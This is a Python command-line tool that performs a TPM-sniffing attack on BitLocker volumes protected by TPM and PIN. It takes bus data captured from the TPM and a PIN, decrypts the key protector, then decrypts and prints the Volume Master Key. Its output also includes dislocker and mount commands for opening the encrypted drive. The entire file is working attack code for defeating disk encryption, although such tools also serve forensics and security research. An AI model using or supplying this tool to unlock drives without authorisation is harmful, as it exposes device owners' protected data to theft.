#!/usr/bin/env python3
import click
from binascii import hexlify,unhexlify

from bitlocker import BitLockerTPMwithPIN
from bitlocker.structure.header import FveHeader
from bitlocker.structure.entry import FveEntry


CONTEXT_SETTINGS = {"help_option_names": ["-h", "--help"]}

@click.command(context_settings=CONTEXT_SETTINGS)
@click.option('--volume', prompt='Targeted volume', help='Target bitlocker volume')
@click.option('--pin', prompt='PIN', help='PIN for TPMAndPIN method')
@click.option('--tpm-data', prompt='Unseal bitlocker encrypted data', help='Sniffed data to decrypt VMK')
@click.option('--output', default=None, help='Output fiel to write the VMK')
def decode_tpm_data(volume, pin, tpm_data, output):
    tpm_data_raw = unhexlify(tpm_data)
    click.echo("[*] Data sniffed from TPM (Encrypted KP container): %s" % hexlify(tpm_data_raw).decode('utf-8'))
    click.echo(FveEntry.load_from_data(tpm_data_raw))

    click.secho("[*] Step 1: Generate key", fg="green")
    header = FveHeader.load_from_volume(volume)
    bde = BitLockerTPMwithPIN(header.block)
    key1 = bde.generate_key1(pin)
    click.echo("[+] Key1 (derivated from PIN): %s" % hexlify(key1).decode('utf-8'))
    
    click.secho("[*] Step 2: Decrypt Key Protector", fg="green")
    key_protector_raw = bde.decode_key_protector_container(key1, tpm_data_raw)
    click.echo("[+] Decrypted Key Protector container: %s" % hexlify(key_protector_raw).decode('utf-8'))
    key_protector = FveEntry.load_from_data(key_protector_raw)
    click.echo(key_protector)

    click.secho("[*] Step 3: Decrypt Volume Master Key", fg="green")
    encrypted_vmk_container_raw = bde.get_encrypted_VMK()
    click.echo("[*] Extracted encrypted VMK container: %s" % hexlify(encrypted_vmk_container_raw).decode('utf-8'))
    volume_master_key_raw = bde.decode_key_protector_container(key_protector.loaded_data.key_data, encrypted_vmk_container_raw)
    click.echo("[+] Decrypted VMK container: %s" % hexlify(volume_master_key_raw).decode('utf-8'))
    volume_master_key_container = FveEntry.load_from_data(volume_master_key_raw)
    click.echo(volume_master_key_container)

    click.echo("")
    click.echo("The VMK is ", nl=False)
    volume_master_key_hex = hexlify(volume_master_key_container.loaded_data.key_data).decode('utf-8')
    click.secho(volume_master_key_hex, bold=True, reverse=True)
    click.echo("")
    click.secho("Save the key into a file:", nl=False, underline=True)
    click.secho(f" echo -n {volume_master_key_hex} | xxd -r -p > vmk.bin")
    if output is not None:
        click.echo("")
        with open(output, 'wb') as fp:
            fp.write(volume_master_key_container.loaded_data.key_data)
        click.echo(f"[+] VMK saved into the file: {output}")
    click.echo("")
    click.secho("Mount with dislocker:", underline=True)
    click.echo(f"""sudo mkdir /mnt/dislocker_tmp
sudo mkdir /mnt/dislocker_tmp2
sudo dislocker -K vmk.bin {volume} /mnt/dislocker_tmp
sudo mount -t ntfs-3g -o remove_hiberfile,recover /mnt/dislocker_tmp/dislocker-file /mnt/dislocker_tmp2
""")

    # encrypted_fvek_container_raw = bde.get_encrypted_FVEK()
    # print("[+] Encrypted FVEK container: %s" % hexlify(encrypted_fvek_container_raw).decode('utf-8'))
    # print(FveEntry.load_from_data(encrypted_fvek_container_raw))

    # full_volume_encryption_key_container_raw = bde.decode_key_protector_container(volume_master_key_container.loaded_data.key_data, encrypted_fvek_container_raw)
    # print("[+] FVEK container: %s" % hexlify(full_volume_encryption_key_container_raw).decode('utf-8'))
    # full_volume_encryption_key_container = FveEntry.load_from_data(full_volume_encryption_key_container_raw)
    # print(full_volume_encryption_key_container)

if __name__ == "__main__":
    decode_tpm_data()
